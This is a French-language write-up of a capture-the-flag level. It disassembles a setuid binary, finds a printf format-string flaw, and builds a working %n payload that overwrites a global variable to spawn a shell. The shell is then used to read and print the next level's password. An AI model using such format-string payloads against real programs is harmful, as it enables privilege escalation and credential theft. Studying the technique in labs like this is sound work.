# Level3

On observe un executable a la racine `level3`

```bash
$ ./level3
Hello World
Hello World
```

On cherche donc a comprendre ce que fait l'executable

```bash
$ gdb level3 -q
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:      push   ebp
   0x0804851b <+1>:      mov    ebp,esp
   0x0804851d <+3>:      and    esp,0xfffffff0
   0x08048520 <+6>:      call   0x80484a4 <v>
   0x08048525 <+11>:     leave
   0x08048526 <+12>:     ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:      push   ebp
   0x080484a5 <+1>:      mov    ebp,esp
   0x080484a7 <+3>:      sub    esp,0x218
   0x080484ad <+9>:      mov    eax,ds:0x8049860
   0x080484b2 <+14>:     mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:     mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:     lea    eax,[ebp-0x208]
   0x080484c4 <+32>:     mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:     call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:     lea    eax,[ebp-0x208]
   0x080484d2 <+46>:     mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:     call   0x8048390 <printf@plt>
   0x080484da <+54>:     mov    eax,ds:0x804988c
   0x080484df <+59>:     cmp    eax,0x40
   0x080484e2 <+62>:     jne    0x8048518 <v+116>
   0x080484e4 <+64>:     mov    eax,ds:0x8049880
   0x080484e9 <+69>:     mov    edx,eax
   0x080484eb <+71>:     mov    eax,0x8048600
   0x080484f0 <+76>:     mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:     mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:     mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:     mov    DWORD PTR [esp],eax
   0x08048507 <+99>:     call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:    mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:    call   0x80483c0 <system@plt>
   0x08048518 <+116>:    leave
   0x08048519 <+117>:    ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir un idee plus clair de `level3`

```bash
$ scp -P 4242 -r level3@192.168.56.102:/home/user/level3/level3 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level3
```

_resultat sauvegarde dans [source.md](source.md)_

On remarque que la fonction `v` compare la valeur de `m` a `64`

On regarde de la valeur de `m` juste avant la comparaison

```bash
(gdb) set disassembly-flavor intel
(gdb) break *v+59
Breakpoint 1 at 0x80484df
(gdb) run <<< "Hello World"
Starting program: /home/user/level3/level3 <<< "Hello World"
Hello World

Breakpoint 1, 0x080484df in v ()
(gdb) i r eax
eax            0x0    0
```

On peut aussi remarquer que la fonction `v` fait un appel a `printf` en utilisant notre `input` directement en parametre. Il existe une faille dans printf dans ce cas la. Nous allons verifier tout ca maintenant

```bash
$ python -c 'print "AAAA %.8x %.8x %.8x %.8x"' | ./level3
AAAA 00000200 b7fd1ac0 b7ff37d0 41414141
```

`%x` nous affiche ici l'adresse dans la stack puis la suivante et ainsi de suite. Nous retombons sur nos `AAAA` avec `41414141`

l'adresse de `m` est `0x804988c`. Nous allons donc chercher a mettre ca en memoire et a le retrouver grace a `%x`

```bash
$ python -c 'print "\x8c\x98\x04\x08 %4$.8x"' | ./level3
� 0804988c
```

Nous allons maintenant utiliser `%n` a la place de `%x` qui nous permet a l'adresse lu (affiche par `%x`) enregistrer le nombre de caratere afficher par printf. Essayons de changer notre `%x` en `%n` et afficher la valeur de `m`

```bash
(gdb) set disassembly-flavor intel
(gdb) break *v+59
Breakpoint 1 at 0x80484df
(gdb) run <<< $(python -c 'print "\x8c\x98\x04\x08%4$n"')
Starting program: /home/user/level3/level3 <<< $(python -c 'print "\x8c\x98\x04\x08%4$n"')
��

Breakpoint 1, 0x080484df in v ()
(gdb) i r eax
eax            0x4   4
```

Grace au `%n` du printf nous avons reussit a ecrire le nombre `4` a l'adresse de `m`. Plus qu'a mettre cette valeur a 64

```bash
(gdb) run <<< $(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
Starting program: /home/user/level3/level3 <<< $(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484df in v ()
(gdb) i r eax
eax            0x40    64
```

plus qu'a essayer

```bash
$ (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
Ctrl+D

level3:$ su level4
Password:

level4:$
```
